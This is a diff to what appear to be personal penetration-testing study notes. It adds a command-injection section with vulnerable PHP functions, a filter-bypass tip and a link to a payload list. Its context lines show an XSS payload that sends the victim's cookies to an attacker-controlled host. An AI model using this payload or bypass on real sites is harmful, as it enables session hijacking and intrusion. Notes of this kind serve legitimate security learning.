@@ -132,6 +132,15 @@ Get cookie from xss:
 - ``` fetch('http://{URL_OR_IP}:9001?cookie=' + btoa(document.cookie) ); ```
 - wait for the victim.
 
+## Command Injection
+- also often known as “Remote Code Execution” (RCE) 
+- https://owasp.org/www-project-top-ten/
+- https://www.contrastsecurity.com/security-influencers/insights-appsec-intelligence-report
+- php vulnerable functions: ``` Exec ```, ``` Passthru ```, ``` System ```
+- php: ``` filter_input ``` https://www.php.net/manual/en/function.filter-input.php
+- use hexadecimal value to bypass the filter.
+- cheat sheet for more payloads: https://github.com/payloadbox/command-injection-payload-list
+
 ## Burp Suite Basic
 **Extensions**
 - java, jython, jRuby
